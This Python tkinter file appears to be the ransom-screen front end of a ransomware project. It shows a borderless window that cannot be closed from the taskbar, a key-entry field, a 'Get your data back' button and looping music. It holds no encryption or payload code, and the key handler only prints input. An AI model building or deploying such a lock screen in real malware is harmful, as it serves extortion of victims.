
from tkinter import *
import os, winsound
from tkinter.ttk import *
from asciiArt import * 
bgVal = "#2B061E"
fgVal = "#D2BF55"

root = Tk()
root.configure(background=bgVal, height = 700, width = 820)
#root.resizable(FALSE, FALSE)    #resizing turned off

#sets the window in center of the screen
root.eval('tk::PlaceWindow %s center' % root.winfo_pathname(root.winfo_id()))

#removes title bar and removes the ability to close the application from task bar
root.overrideredirect(True)

#accepting key
def keyCatch():
    print(keyAccept.get())


style = Style()
style.configure('TButton', font = ('TkFixedFont', 10, 'bold'), foreground = bgVal) 

Label(root,text=art, font='TkFixedFont', background=bgVal, foreground=fgVal).place(relx=.505, rely=.1, anchor="center")

Label(root, text = borderScreen, font = 'TkFixedFont', background=bgVal, foreground= fgVal).place(relx=.5, rely=.5,anchor="center")

Label(root, text=text, background=bgVal, foreground="#39A2AE", font = "TkFixedFont").place(relx=.5, rely=.45, anchor="center")

Label(root,text=musiclLogo, font='TkFixedFont', background=bgVal, foreground="#55DBCB").place(relx=.24, rely=.9, anchor="center")

keyAccept = Entry(root, font = 'TkFixedFont', foreground = "black", background = bgVal)
keyAccept.place(relx=.5, rely=.52, anchor="center")
submitBtn = Button(root, text='Get your data back', command=keyCatch, style='TButton') 
submitBtn.place(relx=.5, rely=.6, anchor="center")


#playing music
winsound.PlaySound('extras/Goosebumps Theme Song (Caspro Remix).wav', winsound.SND_ALIAS | winsound.SND_LOOP + winsound.SND_ASYNC)
root.mainloop()
